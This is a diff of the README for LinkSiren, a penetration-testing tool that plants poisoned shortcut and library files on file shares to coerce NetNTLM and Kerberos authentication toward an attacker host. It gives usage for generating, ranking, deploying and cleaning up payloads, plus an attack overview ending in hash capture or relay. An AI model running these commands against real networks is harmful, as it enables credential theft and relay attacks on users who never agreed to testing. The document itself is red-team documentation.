@@ -1,9 +1,126 @@
-# LinkSiren
-
-## What is this tool?
+# Description
 _The Siren waits thee, singing song for song._ - Walter Savage Landor
 
-LinkSiren distributes .library-ms, .searchConnector-ms, .url, and .lnk files to accessible file shares to coerce NetNTLM authentication over SMB or HTTP from hosts that open them. It's like [Farmer](https://github.com/mdsecactivebreach/Farmer/tree/1f37598125a92c9edf41295c6c1b7c258143968d), [Lnkbomb](https://github.com/dievus/lnkbomb), or [Slinky](https://www.infosecmatter.com/crackmapexec-module-library/?cmem=smb-slinky) but it identifies the best place to put the files for coercion and has scalable deployment and cleanup built in.
+LinkSiren distributes .library-ms, .searchConnector-ms, .url, and .lnk files to accessible file shares to coerce NetNTLM and Kerberos authentication over SMB and HTTP from hosts that open them. It's like [Farmer](https://github.com/mdsecactivebreach/Farmer/tree/1f37598125a92c9edf41295c6c1b7c258143968d), [Lnkbomb](https://github.com/dievus/lnkbomb), or [Slinky](https://www.infosecmatter.com/crackmapexec-module-library/?cmem=smb-slinky) but it identifies the best place to put the files for coercion and has scalable deployment and cleanup built in.
+
+# Usage
+LinkSiren offers the following modes of operation:
+
+## Generate
+Create poisoned files to use for coercion and store them locally.
+```
+python .\link_siren.py generate --help
+usage: link_siren.py generate [-h] -a ATTACKER [-n PAYLOAD]
+
+optional arguments:
+  -h, --help            show this help message and exit
+  -n PAYLOAD, --payload PAYLOAD
+                        Name of payload file ending in .library-ms, .searchConnector-ms, .lnk, or .url
+
+Required Arguments:
+  -a ATTACKER, --attacker ATTACKER
+                        Attacker IP or hostname to place in malicious URL
+```
+
+## Rank
+Given a list of accessible shares, output ranks for the folders within them based on the liklihood placing a file in the folder will coerce authentication from a user.
+```
+python .\link_siren.py rank --help
+usage: link_siren.py rank [-h] -u USERNAME -p PASSWORD -d DOMAIN -t TARGETS [-md MAX_DEPTH] [-at ACTIVE_THRESHOLD] [-f]
+
+optional arguments:
+  -h, --help            show this help message and exit
+  -md MAX_DEPTH, --max-depth MAX_DEPTH
+                        The maximum depth of folders to search within the target.
+  -at ACTIVE_THRESHOLD, --active-threshold ACTIVE_THRESHOLD
+                        Number of days as an integer for active files.
+  -f, --fast            Mark folders active as soon as one active file in them is identified and move on. Ranks are all set to 1 assigned.
+
+Required Arguments:
+  -u USERNAME, --username USERNAME
+                        Username for authenticating to each share
+  -p PASSWORD, --password PASSWORD
+                        Password for authenticating to each share
+  -d DOMAIN, --domain DOMAIN
+                        Domain for authenticating to each share.Specify "." for local authentication
+  -t TARGETS, --targets TARGETS
+                        Path to a text file containing UNC paths to file shares / base directories within which to rank folders as potential locations for placing poisoned files.
+```
+
+## Identify
+Given a list of accessible shares and customizable constraints, including a maximum number of target folders per share, output UNC paths to the optimal folders for placing poisoned files.
+```
+python .\link_siren.py identify --help
+usage: link_siren.py identify [-h] -u USERNAME -p PASSWORD -d DOMAIN -t TARGETS [-md MAX_DEPTH] [-at ACTIVE_THRESHOLD] [-f] [-mf MAX_FOLDERS_PER_TARGET]
+
+optional arguments:
+  -h, --help            show this help message and exit
+  -md MAX_DEPTH, --max-depth MAX_DEPTH
+                        The maximum depth of folders to search within the target
+  -at ACTIVE_THRESHOLD, --active-threshold ACTIVE_THRESHOLD
+                        Max number of days since within which a file is considered active.
+  -f, --fast            Mark folders active as soon as one active file in them is identified and move on. Ranks are all set to 1.
+  -mf MAX_FOLDERS_PER_TARGET, --max-folders-per-target MAX_FOLDERS_PER_TARGET
+                        Maximum number of folders to output as deployment targets per supplied target share or folder.
+
+Required Arguments:
+  -u USERNAME, --username USERNAME
+                        Username for authenticating to each share
+  -p PASSWORD, --password PASSWORD
+                        Password for authenticating to each share
+  -d DOMAIN, --domain DOMAIN
+                        Domain for authenticating to each share.Specify "." for local authentication
+  -t TARGETS, --targets TARGETS
+                        Path to a text file containing UNC paths to file shares / base directories for deployment or from which to remove payload files
+```
+
+## Deploy
+Generate poisoned files for coercion and deploy them to specified UNC paths. Typically the specified UNC paths are the output of `identify` mode. Output a list of UNC paths to folders where payloads were successfully deployed for cleanup.
+```
+python .\link_siren.py deploy --help
+usage: link_siren.py deploy [-h] -u USERNAME -p PASSWORD -d DOMAIN -t TARGETS -a ATTACKER [-n PAYLOAD]
+
+optional arguments:
+  -h, --help            show this help message and exit
+  -n PAYLOAD, --payload PAYLOAD
+                        Name of payload file ending in .library-ms, .searchConnector-ms, .lnk, or .url
+
+Required Arguments:
+  -u USERNAME, --username USERNAME
+                        Username for authenticating to each share
+  -p PASSWORD, --password PASSWORD
+                        Password for authenticating to each share
+  -d DOMAIN, --domain DOMAIN
+                        Domain for authenticating to each share.Specify "." for local authentication
+  -t TARGETS, --targets TARGETS
+                        Path to a text file containing UNC paths to folders into which poisoned files will be deployed.
+  -a ATTACKER, --attacker ATTACKER
+                        Attacker IP or hostname to place in poisoned files.
+```
+
+## Cleanup
+Remove all payloads from the specified UNC paths, typically the output of `deploy` mode.
+```
+python .\link_siren.py cleanup --help
+usage: link_siren.py cleanup [-h] -u USERNAME -p PASSWORD -d DOMAIN -t TARGETS -a ATTACKER [-n PAYLOAD]
+
+optional arguments:
+  -h, --help            show this help message and exit
+  -n PAYLOAD, --payload PAYLOAD
+                        Name of payload file ending in .library-ms, .searchConnector-ms, .lnk, or .url
+
+Required Arguments:
+  -u USERNAME, --username USERNAME
+                        Username for authenticating to each share
+  -p PASSWORD, --password PASSWORD
+                        Password for authenticating to each share
+  -d DOMAIN, --domain DOMAIN
+                        Domain for authenticating to each share.Specify "." for local authentication
+  -t TARGETS, --targets TARGETS
+                        Path to a text file containing UNC paths to folders in which poisoned files are located.
+  -a ATTACKER, --attacker ATTACKER
+                        Attacker IP or hostname to place in poisoned files.
+```
 
 ## Attack Overview
 1. (Optional) Get Intranet-Zoned if you want to coerce HTTP authentication. See the note in [theHackerRecipes WebClient Abuse](https://www.thehacker.recipes/a-d/movement/mitm-and-coerced-authentications/webclient#abuse).
@@ -30,7 +147,7 @@ python -m pip install -r requirements.txt
 python link_siren.py identify --username <username> --password <password> --domain <domain.tld> --targets <shares file>
 
 # Deploy to identified locations
-python link_siren.py deploy--username <username> --password <password> --domain <domain.tld> --targets folder_targets.txt --attacker <attacker IP>
+python link_siren.py deploy --username <username> --password <password> --domain <domain.tld> --targets folder_targets.txt --attacker <attacker IP>
 
 # Capture hashes / relay authentication
 
@@ -102,114 +219,6 @@ I'm looking to add the following features:
 - [ ] Add a progress bar for share crawling
 - [ ] Enable authentication using a NTLM hash
 - [ ] Enable ticket based authnentication (Kerberos)
-
-## Help Text
-```
-# Generate
-python .\link_siren.py generate --help
-usage: link_siren.py generate [-h] -a ATTACKER [-n PAYLOAD]
-
-optional arguments:
-  -h, --help            show this help message and exit
-  -n PAYLOAD, --payload PAYLOAD
-                        Name of payload file ending in .library-ms, .searchConnector-ms, .lnk, or .url
-
-Required Arguments:
-  -a ATTACKER, --attacker ATTACKER
-                        Attacker IP or hostname to place in malicious URL
-
-
-# Rank
-python .\link_siren.py rank --help
-usage: link_siren.py rank [-h] -u USERNAME -p PASSWORD -d DOMAIN -t TARGETS [-md MAX_DEPTH] [-at ACTIVE_THRESHOLD] [-f]
-
-optional arguments:
-  -h, --help            show this help message and exit
-  -md MAX_DEPTH, --max-depth MAX_DEPTH
-                        The maximum depth of folders to search within the target.
-  -at ACTIVE_THRESHOLD, --active-threshold ACTIVE_THRESHOLD
-                        Number of days as an integer for active files.
-  -f, --fast            Mark folders active as soon as one active file in them is identified and move on. Ranks are all set to 1 assigned.
-
-Required Arguments:
-  -u USERNAME, --username USERNAME
-                        Username for authenticating to each share
-  -p PASSWORD, --password PASSWORD
-                        Password for authenticating to each share
-  -d DOMAIN, --domain DOMAIN
-                        Domain for authenticating to each share.Specify "." for local authentication
-  -t TARGETS, --targets TARGETS
-                        Path to a text file containing UNC paths to file shares / base directories within which to rank folders as potential locations for placing poisoned files.
-
-
-# Identify
-python .\link_siren.py identify --help
-usage: link_siren.py identify [-h] -u USERNAME -p PASSWORD -d DOMAIN -t TARGETS [-md MAX_DEPTH] [-at ACTIVE_THRESHOLD] [-f] [-mf MAX_FOLDERS_PER_TARGET]
-
-optional arguments:
-  -h, --help            show this help message and exit
-  -md MAX_DEPTH, --max-depth MAX_DEPTH
-                        The maximum depth of folders to search within the target
-  -at ACTIVE_THRESHOLD, --active-threshold ACTIVE_THRESHOLD
-                        Max number of days since within which a file is considered active.
-  -f, --fast            Mark folders active as soon as one active file in them is identified and move on. Ranks are all set to 1.
-  -mf MAX_FOLDERS_PER_TARGET, --max-folders-per-target MAX_FOLDERS_PER_TARGET
-                        Maximum number of folders to output as deployment targets per supplied target share or folder.
-
-Required Arguments:
-  -u USERNAME, --username USERNAME
-                        Username for authenticating to each share
-  -p PASSWORD, --password PASSWORD
-                        Password for authenticating to each share
-  -d DOMAIN, --domain DOMAIN
-                        Domain for authenticating to each share.Specify "." for local authentication
-  -t TARGETS, --targets TARGETS
-                        Path to a text file containing UNC paths to file shares / base directories for deployment or from which to remove payload files
-
-
-# Deploy
-python .\link_siren.py deploy --help
-usage: link_siren.py deploy [-h] -u USERNAME -p PASSWORD -d DOMAIN -t TARGETS -a ATTACKER [-n PAYLOAD]
-
-optional arguments:
-  -h, --help            show this help message and exit
-  -n PAYLOAD, --payload PAYLOAD
-                        Name of payload file ending in .library-ms, .searchConnector-ms, .lnk, or .url
-
-Required Arguments:
-  -u USERNAME, --username USERNAME
-                        Username for authenticating to each share
-  -p PASSWORD, --password PASSWORD
-                        Password for authenticating to each share
-  -d DOMAIN, --domain DOMAIN
-                        Domain for authenticating to each share.Specify "." for local authentication
-  -t TARGETS, --targets TARGETS
-                        Path to a text file containing UNC paths to folders into which poisoned files will be deployed.
-  -a ATTACKER, --attacker ATTACKER
-                        Attacker IP or hostname to place in poisoned files.
-
-
-# Cleanup
-python .\link_siren.py cleanup --help
-usage: link_siren.py cleanup [-h] -u USERNAME -p PASSWORD -d DOMAIN -t TARGETS -a ATTACKER [-n PAYLOAD]
-
-optional arguments:
-  -h, --help            show this help message and exit
-  -n PAYLOAD, --payload PAYLOAD
-                        Name of payload file ending in .library-ms, .searchConnector-ms, .lnk, or .url
-
-Required Arguments:
-  -u USERNAME, --username USERNAME
-                        Username for authenticating to each share
-  -p PASSWORD, --password PASSWORD
-                        Password for authenticating to each share
-  -d DOMAIN, --domain DOMAIN
-                        Domain for authenticating to each share.Specify "." for local authentication
-  -t TARGETS, --targets TARGETS
-                        Path to a text file containing UNC paths to folders in which poisoned files are located.
-  -a ATTACKER, --attacker ATTACKER
-                        Attacker IP or hostname to place in poisoned files.
-```
 
 ## Note
 This tools is designed for ethical hacking and penetration testing. It should be used exclusively on networks where explicit, written permission has been granted for testing. I accept no responsibility for the safety or effectiveness of this tool. Please don't sue me.
